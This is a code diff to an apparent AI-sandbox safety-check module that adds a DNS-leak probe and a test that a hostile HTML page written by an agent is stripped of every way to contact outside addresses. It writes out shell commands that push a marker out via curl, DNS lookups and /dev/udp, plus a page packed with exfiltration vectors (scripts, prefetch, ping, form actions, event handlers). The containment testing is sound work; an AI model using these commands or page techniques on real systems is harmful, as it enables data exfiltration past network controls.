@@ -23,13 +23,15 @@ from __future__ import annotations
 import asyncio
 import contextlib
 import json
+import re
 import secrets
+import shutil
 from collections.abc import AsyncIterator, Callable
 from contextlib import asynccontextmanager
 from dataclasses import asdict, dataclass, field
 from datetime import UTC, datetime
 from pathlib import Path
-from typing import Literal
+from typing import TYPE_CHECKING, Literal
 
 import httpx
 
@@ -38,8 +40,12 @@ from datalab.credentials import MissingCredential, oracle_password
 from datalab.data.oracle import NotSyntheticDatabase, OracleDatabase
 from datalab.safety import policy
 from datalab.safety.canary import Canaries
+from datalab.sessions.checkpoints import Checkpoints
 from datalab.sessions.containers import SessionContainers, SessionPaths, docker
 from datalab.sessions.tokens import SessionAccess, SessionKind, SessionTokens
+
+if TYPE_CHECKING:
+    from datalab.api.files import Previews
 
 Status = Literal["pass", "fail", "skip"]
 
@@ -89,6 +95,7 @@ class SafetyCheck:
         *,
         model_key: Callable[[], str],
         containers: type[SessionContainers] = SessionContainers,
+        previews: Previews | None = None,
     ) -> None:
         self._settings = settings
         self._tokens = tokens
@@ -96,6 +103,7 @@ class SafetyCheck:
         self._model_key = model_key
         # Tests swap in deliberately broken containers to prove checks can fail.
         self._containers = containers
+        self._previews = previews
         self._port = settings.port
 
     async def run(self) -> SafetyReport:
@@ -111,6 +119,7 @@ class SafetyCheck:
             report.results += await self._research_session_checks(probe, model_reachable)
         report.results.append(await self._image_check())
         report.results.append(await self._browser_policy_check())
+        report.results.append(await self._preview_check())
         report.finished_at = _now()
         return report
 
@@ -178,13 +187,22 @@ class SafetyCheck:
 
         outside, _ = await probe.sh("getent hosts example.com")
         gateway, _ = await probe.sh("getent hosts gateway")
+        # A lookup can carry data in the name even when it fails, so these
+        # must not leave the computer at all. The name is unique to this run:
+        # scripts/dns-leak-test.sh watches the network for it (in CI).
+        leak = f"dnsleak-{secrets.token_hex(6)}"
+        await probe.sh(
+            f"getent hosts {leak}.example.com; curl -s -m 3 http://{leak}.example.org/;"
+            f" bash -c 'for ip in 8.8.8.8 1.1.1.1; do echo {leak} > /dev/udp/$ip/53; done'"
+        )
         results.append(
             _result(
                 "outside_dns_blocked",
                 PROMISE_NETWORK,
                 "Outside names don't resolve (no DNS leaks)",
                 outside != 0 and gateway == 0,
-                "Only the gateway resolves." if outside != 0 else "example.com resolved.",
+                ("Only the gateway resolves." if outside != 0 else "example.com resolved.")
+                + f" (Lookup marker: {leak}.)",
             )
         )
 
@@ -518,6 +536,72 @@ class SafetyCheck:
             "; ".join(problems) if problems else "The security policy allows only DataLab itself.",
         )
 
+    async def _preview_check(self) -> CheckResult:
+        """A hostile page the agent might write, shown the way DataLab shows it."""
+        check_id, label = "preview_contained", "A page the agent writes can't contact anything"
+        if self._previews is None:
+            return CheckResult(check_id, PROMISE_NETWORK, label, "skip", "Previews aren't set up.")
+        # The page isn't rendered here: this checks what DataLab would give a
+        # browser. Nothing should be left that points at this address.
+        canary = self._canaries.new("preview page")
+        root = self._settings.data_dir / "safety" / f"preview_{secrets.token_hex(4)}"
+        token = None
+        try:
+            work = root / "work"
+            (work / "outputs").mkdir(parents=True)
+            (work / "outputs" / "page.html").write_text(
+                _HOSTILE_PAGE.replace("CANARY", f"http://127.0.0.1:{self._port}{canary}")
+            )
+            checkpoints = Checkpoints(root / "store", work)
+            latest = await asyncio.to_thread(checkpoints.take, "Safety check")
+            entries = {
+                rel.removeprefix("outputs/"): entry
+                for rel, entry in checkpoints.entries(latest.number).items()
+                if rel.startswith("outputs/")
+            }
+            token = self._previews.share(checkpoints, entries, "outputs/")
+            host = (
+                self._settings.host if self._settings.host not in ("0.0.0.0", "::") else "127.0.0.1"
+            )
+            host = f"[{host}]" if ":" in host else host  # an IPv6 address
+            folder = f"http://{host}:{self._port}/preview/{token}/"
+            async with httpx.AsyncClient(timeout=5) as client:
+                framed = await client.get(
+                    folder + "page.html", headers={"sec-fetch-dest": "iframe"}
+                )
+                alone = await client.get(
+                    folder + "page.html", headers={"sec-fetch-dest": "document"}
+                )
+        except (OSError, httpx.HTTPError) as error:
+            return CheckResult(check_id, PROMISE_NETWORK, label, "skip", str(error))
+        finally:
+            if token:
+                self._previews.revoke(token)
+            await asyncio.to_thread(shutil.rmtree, root, True)
+        problems = []
+        if framed.status_code != 200:
+            problems.append(f"the preview didn't load ({framed.status_code})")
+        problems += policy.preview_problems(
+            framed.headers.get("content-security-policy", ""), folder
+        )
+        body = framed.text.lower().replace(_OWN_META, "", 1)
+        problems += [f"the page still has {what}" for what in _ACTIVE if what in body]
+        if _HANDLER.search(body):
+            problems.append("the page still has an event handler")
+        if canary.lower() in body:
+            problems.append("the page still has an address outside its folder")
+        if alone.status_code != 404:
+            problems.append("the page opens on its own, outside the viewer's sandboxed frame")
+        return _result(
+            check_id,
+            PROMISE_NETWORK,
+            label,
+            not problems,
+            "; ".join(problems)
+            if problems
+            else "Scripts, links, and outside addresses are removed, and the page is sandboxed.",
+        )
+
     def _known_secrets(self) -> list[str]:
         found = []
         with contextlib.suppress(MissingCredential):
@@ -527,6 +611,30 @@ class SafetyCheck:
                 found.append(oracle_password(self._settings.oracle))
         return found
 
+
+# A page written to send data out, every way a page can. After cleaning,
+# none of these may be left, and nothing may point at CANARY.
+_HOSTILE_PAGE = """<!doctype html><html><head>
+<meta http-equiv="refresh" content="0;url=CANARY?refresh">
+<base href="CANARY/">
+<link rel="prefetch" href="CANARY?prefetch"><link rel="stylesheet" href="CANARY?css">
+<style>@import url("CANARY?import"); body { background: url(CANARY?bg) }</style>
+<script>fetch("CANARY?fetch")</script>
+</head><body>
+<img src="CANARY?img" srcset="CANARY?srcset 2x">
+<a href="CANARY?link" ping="CANARY?ping">a link</a>
+<form action="CANARY?form"><button>go</button></form>
+<iframe src="CANARY?frame"></iframe><object data="CANARY?object"></object>
+<video poster="CANARY?poster"><source src="CANARY?video"></video>
+<svg><image href="CANARY?svg"/><a href="CANARY?svglink"><text>x</text></a>
+<animate attributeName="href" to="CANARY?animate"/></svg>
+<div style="background-image:url(CANARY?style)" onclick="fetch('CANARY?onclick')">x</div>
+</body></html>
+"""
+_ACTIVE = ("<script", "http-equiv", "<base", "<iframe", "<object", "<form")
+# What DataLab adds to every preview itself.
+_OWN_META = '<meta http-equiv="x-dns-prefetch-control" content="off">'
+_HANDLER = re.compile(r"<[^>]*\son[a-z]+\s*=", re.IGNORECASE)
 
 # Requests an agent might send straight to the gateway to get U-M's servers to
 # reach outside on its behalf, or to reach a model that isn't approved. The
